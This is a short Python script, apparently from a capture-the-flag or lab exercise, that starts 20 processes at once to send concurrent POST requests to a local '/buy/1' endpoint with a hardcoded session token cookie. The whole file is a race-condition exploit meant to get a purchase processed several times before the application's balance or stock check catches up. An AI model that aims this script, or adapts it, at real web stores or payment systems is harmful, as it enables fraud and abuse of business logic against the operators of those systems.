from requests import post
from multiprocessing import *
import time

def f():
	post("http://localhost:1002/buy/1", headers = {
		"cookie" : "token=7b728e08-18c5-4f10-bc10-1d303eda3015"

		})

for i in range(20):
	p = Process(target=f)
	p.start()

time.sleep(2)